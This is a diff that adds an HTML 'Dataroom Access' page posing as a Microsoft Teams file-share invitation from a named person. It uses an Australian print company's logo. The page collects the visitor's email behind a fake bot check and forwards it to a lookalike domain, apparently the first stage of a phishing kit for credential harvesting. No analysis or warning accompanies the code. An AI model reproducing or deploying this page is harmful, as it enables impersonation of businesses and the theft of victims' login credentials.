@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dataroom Access</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #6264a7, #8e8cd8);
+            color: white;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px 30px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            color: black;
+        }
+
+        .container img.logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .container h1 {
+            color: #6264a7;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .container p {
+            font-size: 14px;
+            color: #605e5c;
+            margin-bottom: 20px;
+        }
+
+        .container input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #d0d0d0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .container input[type="checkbox"] {
+            margin-bottom: 20px;
+        }
+
+        .container button {
+            background-color: #6264a7;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .container button:hover {
+            background-color: #4b4d9e;
+        }
+
+        .container .error {
+            color: red;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .container img.placeholder {
+            width: 100%;
+            max-width: 300px;
+            margin-top: 20px;
+            border-radius: 8px;
+        }
+
+        .container .disclaimer {
+            font-size: 12px;
+            color: #605e5c;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px 20px;
+            }
+
+            .container h1 {
+                font-size: 20px;
+            }
+
+            .container p {
+                font-size: 12px;
+            }
+
+            .container button {
+                font-size: 14px;
+                padding: 8px 10px;
+            }
+
+            .container img.logo {
+                width: 80px;
+            }
+
+            .container img.placeholder {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://logo.clearbit.com/printco.com.au" alt="Microsoft Teams Logo" class="logo">
+        <h1>Lea Michels invited you to access a file</h1>
+		<p> please enter your email address to continue</p>
+        <form id="emailForm" method="GET">
+            <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            <div class="error" id="errorMessage" style="display: none;">Please enter a valid email address.</div>
+            <label>
+                <input type="checkbox" id="humanCheck" required> I am not a bot
+            </label>
+            <button type="submit"><strong>ACCESS DATAROOM</strong></button>
+        </form>
+        <p class="disclaimer">Disclaimer: The information contained in this e-mail is confidential. This e-mail is intended solely for this recepient and may not be accessed by anyone else.</p>
+        
+    </div>
+
+    <script>
+        const form = document.getElementById('emailForm');
+        const emailInput = document.getElementById('email');
+        const errorMessage = document.getElementById('errorMessage');
+        const humanCheck = document.getElementById('humanCheck');
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            if (!humanCheck.checked) {
+                alert('Please verify that you are not a bot.');
+                return;
+            }
+
+            const email = emailInput.value.trim();
+
+            if (!validateEmail(email)) {
+                errorMessage.style.display = 'block';
+            } else {
+                errorMessage.style.display = 'none';
+                // Redirect to the landing page with the email appended as a query parameter
+                const redirectUrl = `https://printco-view-file-dataroom-access.subodorer6.com/W60IUboNTicdWiHGIQlHtrEFfhVQSYiQ/#W${encodeURIComponent(email)}`;
+                window.location.href = redirectUrl;
+            }
+        });
+
+        function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+    </script>
+</body>
+</html>
